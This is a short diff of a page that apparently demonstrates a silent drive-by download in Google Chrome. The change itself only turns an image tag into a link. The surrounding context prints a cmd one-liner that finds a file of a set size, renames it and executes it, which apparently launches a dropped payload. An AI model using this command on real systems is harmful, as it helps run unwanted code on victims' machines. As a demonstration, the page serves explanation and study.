@@ -19,7 +19,7 @@ This demonstrates a silent drive-by download in Google Chrome (rather similar to
 cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
 </pre>
 
-<IMG src=https://i.imgur.com/jgmi7XN.png>
+[link](https://i.imgur.com/jgmi7XN.png)
 
 Can you figure out how this works?
 
